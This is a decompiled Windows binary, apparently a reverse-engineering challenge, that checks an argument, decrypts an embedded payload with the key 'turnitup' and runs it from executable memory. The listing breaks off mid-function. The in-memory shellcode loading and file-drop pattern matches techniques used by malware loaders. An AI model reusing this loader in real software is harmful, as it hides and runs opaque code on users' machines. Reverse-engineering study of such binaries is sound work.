/* This file was generated by the Hex-Rays decompiler version 8.2.0.230124.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

__int64 __fastcall Somethign(context *context);
_OWORD *sub_7FF702101DA0();
_OWORD *__fastcall sub_7FF702101F80(_BYTE *a1);
__int64 __fastcall sub_7FF702102170(context *a1);
__int64 __fastcall sub_7FF7021023D0(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5);
__int64 __fastcall sub_7FF702102620(char *a1, __int64 a2);
__int64 __fastcall sub_7FF702102670(__int64 a1);
__int64 __fastcall sub_7FF702102910(__int64 a1);
__int64 __fastcall Hash_and_set_key(BYTE *pbData); // idb
__int64 __fastcall Parsing(char *Source, int);
__int64 sub_7FF702103474();
__int64 __fastcall UserMathErrorFunction(struct _exception *a1);
void sub_7FF702103534();
char sub_7FF702103544();
void *sub_7FF70210354C();
void *sub_7FF702103554();
void *sub_7FF702103584();
void *sub_7FF70210358C();
void sub_7FF702103594();
void __cdecl RTC_Initialize();
void __cdecl RTC_Initialize_0();
// __vcrt_bool __cdecl _vcrt_uninitialize(__vcrt_bool Terminating);
// __int64 __fastcall _AdjustPointer(_QWORD, _QWORD); weak
// __int64 __fastcall NLG_Notify(_QWORD, _QWORD, _QWORD); weak
// __int64 _NLG_Return2(void); weak
// __int64 GetImageBase(void); weak
// __int64 GetThrowImageBase(void); weak
// void *__cdecl memmove(void *, const void *Src, size_t Size);
__int64 __fastcall BuildCatchObjectHelperInternal___FrameHandler3_(EHExceptionRecord *pExcept, __int64 *pRN, const _s_HandlerType *pCatch, const _s_CatchableType *pConv);
void __fastcall std::invalid_argument::invalid_argument(std::invalid_argument *this, const std::invalid_argument *__that); // idb
_QWORD *__fastcall sub_7FF7021063A8(_QWORD *a1);
__int64 __fastcall CallSettingFrameEncoded(__int64, __int64, __int64, unsigned int); // idb
// __int64 __fastcall _std_exception_copy(_QWORD); weak
// errno_t __cdecl strcpy_s(char *Destination, rsize_t SizeInBytes, const char *Source);
__int64 sub_7FF702107728();
void __fastcall sub_7FF702107730(int a1);
void __fastcall sub_7FF702107758(__int64 a1);
// __int64 __fastcall unknown_libname_14(void *Block); idb
__int64 __fastcall sub_7FF702107E10(void **a1);
__int64 __fastcall sub_7FF702107E2C(void **a1);
void __fastcall sub_7FF70210824C(__int64 a1);
int *sub_7FF702108334();
void **sub_7FF70210833C();
__int64 sub_7FF70210845C();
void *sub_7FF702108490();
int __fastcall sub_7FF7021087E0(_onexit_t Function);
// int __cdecl register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
__vcrt_bool sub_7FF70210892C();
// void __cdecl __noreturn abort();
void __fastcall sub_7FF702108D80(__int64 a1);
// __int64 __fastcall invalid_parameter_internal(wchar_t *Expression, wchar_t *FunctionName, wchar_t *FileName, unsigned int LineNo, uintptr_t, __crt_cached_ptd_host *); idb
void __fastcall __spoils<rax,rcx,rdx,r8,r9,r10,r11,xmm0,xmm4,xmm5> _acrt_update_locale_info(__acrt_ptd *const ptd, __crt_multibyte_data **const multibyte_info);
void __fastcall _acrt_update_locale_info_explicit(__acrt_ptd *const ptd, __crt_locale_data **const locale_info, const unsigned __int64 current_global_state_index); // idb
void __fastcall __spoils<rax,rcx,rdx,r8,r9,r10,r11,xmm0,xmm4,xmm5> _acrt_update_locale_info_0(__acrt_ptd *const ptd, __crt_multibyte_data **const multibyte_info);
void __fastcall _acrt_update_locale_info_explicit_0(__acrt_ptd *const ptd, __crt_locale_data **const locale_info, const unsigned __int64 current_global_state_index); // idb
// __int64 _acrt_update_thread_multibyte_data(void); weak
void __fastcall sub_7FF70210B9D0(int a1);
void __fastcall sub_7FF70210BA24(int a1);
void __fastcall _acrt_lowio_lock_fh(int fh); // idb
void __fastcall _acrt_lowio_lock_fh_0(int fh); // idb
// __int64 _acrt_update_thread_locale_data(void); weak
char sub_7FF70210CECC();
void __fastcall sub_7FF70210CFB4(__int64 a1);
void __fastcall sub_7FF70210D804(__int64 a1);
void __fastcall sub_7FF70210D810(__int64 a1);
BOOL sub_7FF702110BC8();
// __int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_ad8af0d99a0adf03d037d7dffe354bb5_,_lambda_c9ba49e555ba839a7b07aa3fbecb7617_ &,_lambda_2f1ebd5d68526518146ae959c9e734c8_>(_QWORD, _QWORD, _QWORD, _QWORD); weak
__int64 __fastcall close_internal(unsigned int fh, __crt_cached_ptd_host *ptd);
llvm::AttributeImpl *__fastcall __spoils<rcx,rdx,r8,r9,r10,r11,xmm0,xmm4,xmm5> llvm::AttributeImpl::`scalar deleting destructor'(llvm::AttributeImpl *this, char a2);
void __cdecl j_j_free(void *Block);
// int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *CryptCreateHash)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
// extern BOOL (__stdcall *CryptDeriveKey)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY *phKey);
// extern BOOL (__stdcall *CryptSetKeyParam)(HCRYPTKEY hKey, DWORD dwParam, const BYTE *pbData, DWORD dwFlags);
// extern DWORD (__stdcall *GetTickCount)();
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
void *std::exception::`vftable' = &unknown_libname_3; // weak
void *std::bad_exception::`vftable' = &unknown_libname_3; // weak
void *type_info::`vftable' = &llvm::AttributeImpl::`scalar deleting destructor'; // weak
_DWORD dword_7FF70211A8C0[256] =
{
  0,
  1996959894,
  -301047508,
  -1727442502,
  124634137,
  1886057615,
  -379345611,
  -1637575261,
  249268274,
  2044508324,
  -522852066,
  -1747789432,
  162941995,
  2125561021,
  -407360249,
  -1866523247,
  498536548,
  1789927666,
  -205950648,
  -2067906082,
  450548861,
  1843258603,
  -187386543,
  -2083289657,
  325883990,
  1684777152,
  -43845254,
  -1973040660,
  335633487,
  1661365465,
  -99664541,
  -1928851979,
  997073096,
  1281953886,
  -715111964,
  -1570279054,
  1006888145,
  1258607687,
  -770865667,
  -1526024853,
  901097722,
  1119000684,
  -608450090,
  -1396901568,
  853044451,
  1172266101,
  -589951537,
  -1412350631,
  651767980,
  1373503546,
  -925412992,
  -1076862698,
  565507253,
  1454621731,
  -809855591,
  -1195530993,
  671266974,
  1594198024,
  -972236366,
  -1324619484,
  795835527,
  1483230225,
  -1050600021,
  -1234817731,
  1994146192,
  31158534,
  -1731059524,
  -271249366,
  1907459465,
  112637215,
  -1614814043,
  -390540237,
  2013776290,
  251722036,
  -1777751922,
  -519137256,
  2137656763,
  141376813,
  -1855689577,
  -429695999,
  1802195444,
  476864866,
  -2056965928,
  -228458418,
  1812370925,
  453092731,
  -2113342271,
  -183516073,
  1706088902,
  314042704,
  -1950435094,
  -54949764,
  1658658271,
  366619977,
  -1932296973,
  -69972891,
  1303535960,
  984961486,
  -1547960204,
  -725929758,
  1256170817,
  1037604311,
  -1529756563,
  -740887301,
  1131014506,
  879679996,
  -1385723834,
  -631195440,
  1141124467,
  855842277,
  -1442165665,
  -586318647,
  1342533948,
  654459306,
  -1106571248,
  -921952122,
  1466479909,
  544179635,
  -1184443383,
  -832445281,
  1591671054,
  702138776,
  -1328506846,
  -942167884,
  1504918807,
  783551873,
  -1212326853,
  -1061524307,
  -306674912,
  -1698712650,
  62317068,
  1957810842,
  -355121351,
  -1647151185,
  81470997,
  1943803523,
  -480048366,
  -1805370492,
  225274430,
  2053790376,
  -468791541,
  -1828061283,
  167816743,
  2097651377,
  -267414716,
  -2029476910,
  503444072,
  1762050814,
  -144550051,
  -2140837941,
  426522225,
  1852507879,
  -19653770,
  -1982649376,
  282753626,
  1742555852,
  -105259153,
  -1900089351,
  397917763,
  1622183637,
  -690576408,
  -1580100738,
  953729732,
  1340076626,
  -776247311,
  -1497606297,
  1068828381,
  1219638859,
  -670225446,
  -1358292148,
  906185462,
  1090812512,
  -547295293,
  -1469587627,
  829329135,
  1181335161,
  -882789492,
  -1134132454,
  628085408,
  1382605366,
  -871598187,
  -1156888829,
  570562233,
  1426400815,
  -977650754,
  -1296233688,
  733239954,
  1555261956,
  -1026031705,
  -1244606671,
  752459403,
  1541320221,
  -1687895376,
  -328994266,
  1969922972,
  40735498,
  -1677130071,
  -351390145,
  1913087877,
  83908371,
  -1782625662,
  -491226604,
  2075208622,
  213261112,
  -1831694693,
  -438977011,
  2094854071,
  198958881,
  -2032938284,
  -237706686,
  1759359992,
  534414190,
  -2118248755,
  -155638181,
  1873836001,
  414664567,
  -2012718362,
  -15766928,
  1711684554,
  285281116,
  -1889165569,
  -127750551,
  1634467795,
  376229701,
  -1609899400,
  -686959890,
  1308918612,
  956543938,
  -1486412191,
  -799009033,
  1231636301,
  1047427035,
  -1362007478,
  -640263460,
  1088359270,
  936918000,
  -1447252397,
  -558129467,
  1202900863,
  817233897,
  -1111625188,
  -893730166,
  1404277552,
  615818150,
  -1160759803,
  -841546093,
  1423857449,
  601450431,
  -1285129682,
  -1000256840,
  1567103746,
  711928724,
  -1274298825,
  -1022587231,
  1510334235,
  755167117
}; // weak
void (*qword_7FF70211B528[2])(void) = { NULL, NULL }; // weak
void (*qword_7FF70211B538)(void) = NULL; // weak
__int64 qword_7FF70211E020 = -47936899621427i64; // weak
uintptr_t _security_cookie = 47936899621426ui64;
int dword_7FF70211E7B0 = -2; // weak
HANDLE hObject = (HANDLE)0xFFFFFFFFFFFFFFFEi64; // idb
_OWORD xmmword_7FF70211EAE0[11] =
{
  0xD3484F3E1CF99D9615B2436323A8C0D7i64,
  0x87F7162A3A7C7943758D6331E4BD2180i64,
  0x67D57405228C448453161D253DC68770i64,
  0x801EF0B7608E9263486E5A4F2ACD1913i64,
  0xFFFF887D968B62C5139B24DBCCABAF8Bi64,
  0x12CEC5D18942E6485A312BFD50155983i64,
  0xFEFC1213A42500EC2AEDEEF732A9C09Bi64,
  0xECACB3C283ADE7527A992CA23DCB4880i64,
  0x97D55B7B085484FEE1890D8E35CB9137i64,
  0x8720372D43ADC0B8E7B8EC95B13C92BCi64,
  0x8C37DBC7000702819D4699EAF23EC9C5i64
}; // weak
_UNKNOWN unk_7FF702149420; // weak
union _SLIST_HEADER stru_7FF7021498A0 = { { 0ui64, 0ui64 } }; // weak
_UNKNOWN unk_7FF7021498B0; // weak
_UNKNOWN unk_7FF7021498B8; // weak
int dword_7FF7021498C0 = 0; // weak
__int64 (*qword_7FF7021498C8)(void) = NULL; // weak
int dword_7FF702149A30; // weak
__int64 qword_7FF702149A38; // weak
void *qword_7FF702149B58; // idb
void *qword_7FF702149B60; // idb
__int64 qword_7FF702149B70; // weak
int dword_7FF702149B88; // weak
void *qword_7FF702149B90; // idb
int dword_7FF702149BB4; // weak
_UNKNOWN unk_7FF702149BB8; // weak
_onexit_table_t stru_7FF702149BC0; // idb
__int64 qword_7FF702149BF0; // weak
__int64 qword_7FF702149BF8[]; // weak
struct __crt_multibyte_data *Block; // idb
_UNKNOWN unk_7FF702149C20; // weak
__int64 qword_7FF702149E60[128]; // weak
int dword_7FF70214A260; // weak
HANDLE hHeap; // idb
__int64 qword_7FF70214A410; // weak
HCRYPTKEY hKey; // idb
_UNKNOWN unk_7FF70214A9F8; // weak
_UNKNOWN unk_7FF70214AA00; // weak


//----- (00007FF702101000) ----------------------------------------------------
size_t __fastcall sub_7FF702101000(const char *String, size_t MaxCount)
{
  if ( String )
    return strnlen(String, MaxCount);
  else
    return 0i64;
}

//----- (00007FF702101020) ----------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char *v4; // rdx
  bool v6; // cl
  _OWORD *buffer; // rdi
  DWORD TickCount; // eax
  const char *v9; // rcx
  DWORD v10; // [rsp+2Ch] [rbp-D4h]
  __int128 v11; // [rsp+30h] [rbp-D0h]
  __int128 v12; // [rsp+40h] [rbp-C0h] BYREF
  char *v13; // [rsp+50h] [rbp-B0h]
  _BYTE v14[48]; // [rsp+58h] [rbp-A8h]
  __int64 v15; // [rsp+88h] [rbp-78h]
  __int128 v16[3]; // [rsp+90h] [rbp-70h] BYREF
  __int64 v17; // [rsp+C0h] [rbp-40h]
  char Destination[1200]; // [rsp+D0h] [rbp-30h] BYREF
  int v19; // [rsp+5A0h] [rbp+4A0h] BYREF
  __int16 v20; // [rsp+5A4h] [rbp+4A4h]

  if ( argc != 2 )
    return 0;
  v10 = argv[1][6];
  v4 = argv[1];
  if ( v4[2] + 4 * v4[1] != 295 )
    return 0;
  DWORD1(v12) = 2054187386;
  WORD4(v12) = 97;
  v13 = aAzbqcedtexfhgo;
  v6 = v4[5] == 82;
  *(_QWORD *)v14 = 0xCAFE0000CB5Di64;
  *(_QWORD *)&v11 = 0xE685500000000i64;
  *((_QWORD *)&v11 + 1) = v10 | 0x4000000000i64;
  strcpy((char *)&v12, "R% ");
  BYTE2(v15) = v6;
  *(_WORD *)((char *)&v15 + 3) = 26982;
  BYTE5(v15) = 110;
  HIWORD(v15) = 0;
  LOWORD(v15) = 95;
  *(_OWORD *)&v14[8] = v11;
  *(_OWORD *)&v14[24] = v12;
  v16[0] = *(_OWORD *)v14;
  v16[1] = *(_OWORD *)&v14[16];
  v16[2] = (__int128)_mm_unpacklo_pd(*(__m128d *)&v14[32], (__m128d)(unsigned __int64)aAzbqcedtexfhgo);
  v17 = v15;
  if ( !v6 )
    return 0;
  buffer = VirtualAlloc(0i64, 0x99ui64, 0x3000u, v10);
  if ( buffer )
  {
    memset(Destination, 0, 1192ui64);
    TickCount = GetTickCount();
    v9 = argv[1];
    *(_DWORD *)&Destination[256] = TickCount;
    v19 = 0;
    v20 = 0;
    v19 = *(_DWORD *)(v9 + 7);
    LOBYTE(v20) = v9[11];
    *buffer = xmmword_7FF70211EA00;
    buffer[1] = xmmword_7FF70211EA10;
    buffer[2] = xmmword_7FF70211EA20;
    buffer[3] = xmmword_7FF70211EA30;
    buffer[4] = xmmword_7FF70211EA40;
    buffer[5] = xmmword_7FF70211EA50;
    buffer[6] = xmmword_7FF70211EA60;
    buffer[7] = xmmword_7FF70211EA70;
    buffer[8] = xmmword_7FF70211EA80;
    *((_QWORD *)buffer + 18) = qword_7FF70211EA90;
    *((_BYTE *)buffer + 152) = byte_7FF70211EA98;
    *((_BYTE *)buffer + 65) = argv[1][12];
    ((void (__fastcall *)(int *))buffer)(&v19);
    strcpy_s(Destination, 256ui64, argv[1]);
    *(_QWORD *)&Destination[264] = v16;
    *(_QWORD *)&Destination[792] = GetTickCount;
    *(_QWORD *)&Destination[800] = GetProcAddress;
    *(_QWORD *)&Destination[808] = LoadLibraryW;
    *(_QWORD *)&Destination[816] = GetModuleFileNameW;
    *(_QWORD *)&Destination[824] = CreateFileW;
    *(_QWORD *)&Destination[832] = ReadFile;
    *(_QWORD *)&Destination[840] = WriteFile;
    *(_QWORD *)&Destination[848] = Sleep;
    *(_QWORD *)&Destination[856] = ExitProcess;
    *(_QWORD *)&Destination[864] = VirtualAlloc;
    *(_QWORD *)&Destination[0x368] = free;
    *(_QWORD *)&Destination[0x370] = GetStdHandle;
    *(_QWORD *)&Destination[0x380] = strtol;
    *(_QWORD *)&Destination[0x388] = StrnLen;
    *(_QWORD *)&Destination[0x390] = Parsing;
    *(_QWORD *)&Destination[0x398] = Hash_and_set_key;
    *(_QWORD *)&Destination[0x3A0] = Decrypt_with_static_key;
    *(_QWORD *)&Destination[0x3A8] = Execute_;
    *(_QWORD *)&Destination[0x3B0] = Proc;
    Somethign((context *)Destination);
  }
  return DWORD2(v16[0]);
}
// 7FF70211EA00: using guessed type __int128 xmmword_7FF70211EA00;
// 7FF70211EA10: using guessed type __int128 xmmword_7FF70211EA10;
// 7FF70211EA20: using guessed type __int128 xmmword_7FF70211EA20;
// 7FF70211EA30: using guessed type __int128 xmmword_7FF70211EA30;
// 7FF70211EA40: using guessed type __int128 xmmword_7FF70211EA40;
// 7FF70211EA50: using guessed type __int128 xmmword_7FF70211EA50;
// 7FF70211EA60: using guessed type __int128 xmmword_7FF70211EA60;
// 7FF70211EA70: using guessed type __int128 xmmword_7FF70211EA70;
// 7FF70211EA80: using guessed type __int128 xmmword_7FF70211EA80;
// 7FF70211EA90: using guessed type __int64 qword_7FF70211EA90;
// 7FF70211EA98: using guessed type char byte_7FF70211EA98;

//----- (00007FF7021013E0) ----------------------------------------------------
__int64 __fastcall Somethign(context *context)
{
  const CHAR *v2; // rax
  void (__fastcall **ExitProcess)(__int64); // r15
  char *v4; // rbx
  int number; // esi
  WCHAR *v6; // r14
  const CHAR *v7; // rbx
  unsigned __int64 v8; // rdi
  int v9; // eax
  int cchWideChar; // r12d
  WCHAR *lpWideCharStr; // rax
  void (__fastcall *GetProcAddress_)(char *, int *, wchar_t *, WCHAR *); // r12
  void *v13; // r12
  int v14; // ecx
  int v15; // ebx
  __int64 v16; // r8
  __int64 v17; // r14
  _BYTE *v18; // rax
  _BYTE *v19; // r8
  _BYTE *v20; // r9
  int v21; // ecx
  unsigned __int64 i; // rdx
  int v23; // eax
  __int64 v24; // rcx
  char v25; // dl
  __m128i v26; // xmm2
  const __m128i *v27; // rax
  __m128i v28; // xmm2
  __m128i v29; // xmm2
  __m128i v30; // xmm0
  _BYTE *v31; // rax
  __int64 v32; // rcx
  _OWORD *v33; // rax
  char data[16]; // [rsp+40h] [rbp-C0h] BYREF
  char v36[16]; // [rsp+50h] [rbp-B0h] BYREF
  int v37[4]; // [rsp+60h] [rbp-A0h] BYREF
  wchar_t Str[296]; // [rsp+70h] [rbp-90h] BYREF
  char v39; // [rsp+2D0h] [rbp+1D0h] BYREF
  LPCCH lpMultiByteStr; // [rsp+2D8h] [rbp+1D8h] BYREF
  __int64 (__fastcall *virall)(_QWORD); // [rsp+2E0h] [rbp+1E0h]
  void *Block; // [rsp+2E8h] [rbp+1E8h]

  Block = strdup(context->input);
  v2 = strchr((const char *)Block, '/');
  lpMultiByteStr = v2;
  ExitProcess = &context->ExitProcess;
  if ( !v2 )
  {
    (*ExitProcess)(2i64);
    v2 = lpMultiByteStr;
  }
  lpMultiByteStr = v2 + 1;
  v4 = strchr(v2 + 2, '/');
  if ( !v4 )
    (*ExitProcess)(2i64);
  *v4 = 0;
  number = strtol(lpMultiByteStr, (char **)&lpMultiByteStr, 10);
  context->GetModuleFileNameW(0i64, Str, 260i64);
  v6 = 0i64;
  *wcsrchr(Str, '\\') = 0;
  virall = (__int64 (__fastcall *)(_QWORD))context->LoadLibraryW(L"user32.dll");
  if ( !virall )
    (*ExitProcess)(2i64);
  v7 = lpMultiByteStr;
  v8 = -1i64;
  if ( lpMultiByteStr )
  {
    v9 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, 0i64, 0);
    cchWideChar = v9;
    if ( v9 )
    {
      lpWideCharStr = (WCHAR *)j__malloc_base(2i64 * v9);
      v6 = lpWideCharStr;
      if ( lpWideCharStr )
      {
        if ( MultiByteToWideChar(0xFDE9u, 0, v7, -1, lpWideCharStr, cchWideChar) )
          goto LABEL_13;
        free(v6);
      }
      v6 = 0i64;
    }
  }
LABEL_13:
  strcpy(v36, "wsprintfW");
  GetProcAddress_ = (void (__fastcall *)(char *, int *, wchar_t *, WCHAR *))context->GetProcAddress(virall, v36);
  if ( !GetProcAddress_ )
    (*ExitProcess)(2i64);
  v37[0] = 's\0%';                              // %0\s\\0\%s
  v37[1] = '%\0\\';
  v37[2] = 's';
  GetProcAddress_(context->prc_address, v37, Str, v6);// GetProcAddress
  v13 = (void *)context->CreateFileW((__int64)context->prc_address, 0x40000000i64, 1i64);
  if ( v13 == (void *)-1i64 )
    (*ExitProcess)(2i64);
  v14 = number;
  v15 = 0;
  do
  {
    v16 = v15++;
    v14 /= 10;
  }
  while ( v14 );
  v17 = v16;
  v18 = j__malloc_base(v16 + 2);
  v19 = v18;
  if ( v18 )
  {
    if ( number )
    {
      v20 = &v18[v17];
      do
      {
        *v20-- = number % 10 + 48;
        number /= 10;
      }
      while ( number );
    }
    v21 = 0;
    v18[v15] = 0;
    do
      ++v8;
    while ( v18[v8] );
    for ( i = 0i64; i < v8; v21 = (v23 - 48) | (16 * ((v23 - 48) | (16 * v21))) )
      v23 = (char)v19[i++];
  }
  else
  {
    v21 = 0;
  }
  dword_7FF70211EB90 = v21;
  dword_7FF70211EBC4 = GetTickCount();
  GetLocalTime(&SystemTime);
  v24 = 2720i64;
  v25 = dword_7FF70211EBC0 + LOBYTE(SystemTime.wDay);
  v26 = _mm_cvtsi32_si128((char)(dword_7FF70211EBC0 + LOBYTE(SystemTime.wDay)));
  v27 = (const __m128i *)&unk_7FF70211EBF0;
  v28 = _mm_unpacklo_epi8(v26, v26);
  v29 = _mm_shuffle_epi32(_mm_unpacklo_epi16(v28, v28), 0);
  do
  {
    v30 = _mm_loadu_si128(v27 - 1);
    v27 += 4;
    v27[-5] = _mm_add_epi8(v30, v29);
    v27[-4] = _mm_add_epi8(_mm_loadu_si128(v27 - 4), v29);
    v27[-3] = _mm_add_epi8(v29, _mm_loadu_si128(v27 - 3));
    v27[-2] = _mm_add_epi8(v29, _mm_loadu_si128(v27 - 2));
    --v24;
  }
  while ( v24 );
  v31 = &unk_7FF7021493E0;
  v32 = 55i64;
  do
  {
    *v31++ += v25;
    --v32;
  }
  while ( v32 );
  context->WriteFile(v13, &dword_7FF70211EB90, 174216i64, &v39, 0i64);
  CloseHandle(v13);
  free(Block);
  strcpy(data, "turnitup");
  context->Hash_and_set_key(data);
  context->Decrypt_with_static_key(xmmword_7FF70211EAE0, 176i64);
  virall = (__int64 (__fastcall *)(_QWORD))context->VirtualAlloc(0i64, 176i64, 12288i64, 64i64);
  if ( !virall )
    (*ExitProcess)(*(unsigned int *)(context->sus2 + 8));
  v33 = virall;
  *(_OWORD *)virall = xmmword_7FF70211EAE0[0];
  v33[1] = xmmword_7FF70211EAE0[1];
  v33[2] = xmmword_7FF70211EAE0[2];
  v33[3] = xmmword_7FF70211EAE0[3];
  v33[4] = xmmword_7FF70211EAE0[4];
  v33[5] = xmmword_7FF70211EAE0[5];
  v33[6] = xmmword_7FF70211EAE0[6];
  v33[7] = xmmword_7FF70211EAE0[7];
  v33[8] = xmmword_7FF70211EAE0[8];
  v33[9] = xmmword_7FF70211EAE0[9];
  v33[10] = xmmword_7FF70211EAE0[10];
  return virall(context);
}
// 7FF70211A8A0: using guessed type wchar_t aUser32Dll_0[11];
// 7FF70211EAE0: using guessed type _OWORD xmmword_7FF70211EAE0[11];
// 7FF70211EB90: using guessed type int dword_7FF70211EB90;
// 7FF70211EBC0: using guessed type int dword_7FF70211EBC0;
// 7FF70211EBC4: using guessed type int dword_7FF70211EBC4;

//----- (00007FF7021018B0) ----------------------------------------------------
__int64 __fastcall sub_7FF7021018B0(__int64 a1)
{
  const char *v2; // rbp
  const char *v3; // rbx
  int v4; // edx
  char v5; // al
  int v6; // edi
  int i; // ecx
  LPCCH v8; // r14
  rsize_t v9; // rbx
  char *v10; // rax
  __int64 v11; // rcx
  unsigned int v12; // r12d
  char v13; // al
  const char *v14; // rbp
  __int64 v15; // rbx
  int v16; // ecx
  rsize_t v17; // rbx
  char *v18; // rax
  const CHAR *v19; // r14
  const CHAR *v20; // r14
  int v21; // eax
  int cchWideChar; // ebp
  WCHAR *lpWideCharStr; // rax
  WCHAR *v24; // rbx
  void *v25; // rbp
  unsigned int v26; // r8d
  int *j; // rdx
  unsigned int v28; // eax
  bool v29; // zf
  int *v30; // rax
  signed __int64 v31; // rbx
  int v32; // ecx
  int v33; // edx
  __m128i v34; // xmm2
  int *v35; // rax
  __m128i v36; // xmm2
  __int64 v37; // rcx
  __m128i v38; // xmm2
  __m128i v39; // xmm0
  int *v40; // rax
  __int64 v41; // rcx
  HANDLE CurrentProcess; // rax
  void *v43; // rax
  wchar_t Str[264]; // [rsp+40h] [rbp-2AAC8h] BYREF
  int v46[43556]; // [rsp+250h] [rbp-2A8B8h] BYREF
  int v47; // [rsp+2AB10h] [rbp+8h] BYREF
  LPCCH lpMultiByteStr; // [rsp+2AB18h] [rbp+10h] BYREF

  v2 = (const char *)a1;
  v3 = (const char *)a1;
  *(_DWORD *)(*(_QWORD *)(a1 + 264) + 8i64) = 4;
  v4 = *(_DWORD *)(*(_QWORD *)(a1 + 264) + 8i64);
  if ( v4 == 1 )
  {
    if ( *(_BYTE *)a1 == 47 )
    {
      do
        ++v3;
      while ( *v3 == 47 );
    }
    v2 = v3;
  }
  v5 = *v3;
  v6 = 0;
  for ( i = 0; v5; ++v3 )
  {
    if ( v5 == 47 )
    {
      if ( ++i == v4 )
        break;
      for ( ; v3[1] == 47; ++v3 )
        ;
      v2 = v3 + 1;
    }
    v5 = v3[1];
  }
  if ( i >= v4 )
  {
    v9 = v3 - v2;
    v10 = (char *)j__malloc_base(v9 + 1);
    v8 = v10;
    if ( v10 )
    {
      strncpy_s(v10, v9 + 1, v2, v9);
      v8[v9] = 0;
    }
    else
    {
      v8 = 0i64;
    }
  }
  else
  {
    v8 = 0i64;
  }
  v11 = *(_QWORD *)(a1 + 264);
  lpMultiByteStr = v8;
  v12 = *v8;
  if ( *(_BYTE *)(v11 + 31) != v8[3]
    || *(_BYTE *)(v11 + 29) != v8[2]
    || *(_BYTE *)(v11 + 32) != v8[5]
    || *(_BYTE *)(v11 + 30) != v8[1]
    || *(_BYTE *)(v11 + 28) != v8[4] )
  {
    (*(void (__fastcall **)(_QWORD))(a1 + 856))(*(unsigned int *)(v11 + 8));
    v8 = lpMultiByteStr;
  }
  strcpy_s((char *)(a1 + 1060), 0x20ui64, v8);
  v13 = *(_BYTE *)a1;
  v14 = (const char *)a1;
  v15 = a1;
  v16 = 0;
  if ( !*(_BYTE *)a1 )
    goto LABEL_33;
  do
  {
    if ( v13 == 47 )
    {
      if ( ++v16 == 2 )
        goto LABEL_31;
      for ( ; *(_BYTE *)(v15 + 1) == 47; ++v15 )
        ;
      v14 = (const char *)(v15 + 1);
    }
    v13 = *(_BYTE *)++v15;
  }
  while ( v13 );
  if ( v16 < 2 )
    goto LABEL_33;
LABEL_31:
  v17 = v15 - (_QWORD)v14;
  v18 = (char *)j__malloc_base(v17 + 1);
  v19 = v18;
  if ( v18 )
  {
    strncpy_s(v18, v17 + 1, v14, v17);
    v19[v17] = 0;
  }
  else
  {
LABEL_33:
    v19 = 0i64;
  }
  lpMultiByteStr = v19;
  strcpy_s((char *)(a1 + 996), 0x20ui64, v19);
  strtol(lpMultiByteStr, (char **)&lpMultiByteStr, 10);
  v20 = lpMultiByteStr;
  if ( !lpMultiByteStr )
    goto LABEL_39;
  v21 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, 0i64, 0);
  cchWideChar = v21;
  if ( !v21 )
    goto LABEL_39;
  lpWideCharStr = (WCHAR *)j__malloc_base(2i64 * v21);
  v24 = lpWideCharStr;
  if ( !lpWideCharStr )
    goto LABEL_39;
  if ( !MultiByteToWideChar(0xFDE9u, 0, v20, -1, lpWideCharStr, cchWideChar) )
  {
    free(v24);
LABEL_39:
    v24 = 0i64;
  }
  (*(void (__fastcall **)(_QWORD, wchar_t *, __int64))(a1 + 816))(0i64, Str, 260i64);
  *wcsrchr(Str, 0x5Cu) = 0;
  v25 = (void *)(*(__int64 (__fastcall **)(__int64, __int64, __int64))(a1 + 824))(a1 + 272, 0x80000000i64, 1i64);
  memset(v46, 0, 0x2A888ui64);
  if ( !(*(unsigned int (__fastcall **)(void *, int *, __int64, int *, _QWORD))(a1 + 832))(
          v25,
          v46,
          174216i64,
          &v47,
          0i64)
    || v47 != 174216 )
  {
    (*(void (__fastcall **)(_QWORD))(a1 + 856))(*(unsigned int *)(*(_QWORD *)(a1 + 264) + 8i64));
  }
  if ( v46[0] != 288568183 )
    (*(void (__fastcall **)(_QWORD))(a1 + 856))(*(unsigned int *)(*(_QWORD *)(a1 + 264) + 8i64));
  v26 = v46[1];
  for ( j = &v46[2]; ; j = (int *)((char *)j + 1) )
  {
    v28 = v26 >> (8 * (v6 % 4));
    v29 = (unsigned __int8)v28 == *(_BYTE *)j;
    *(_BYTE *)j ^= v28;
    if ( v29 && !*((_BYTE *)j - 1) )
      break;
    ++v6;
  }
  v30 = &v46[2];
  v31 = (char *)v24 - (char *)&v46[2];
  do
  {
    v32 = *(unsigned __int16 *)((char *)v30 + v31);
    v33 = *(unsigned __int16 *)v30 - v32;
    if ( v33 )
      break;
    v30 = (int *)((char *)v30 + 2);
  }
  while ( v32 );
  if ( v33 )
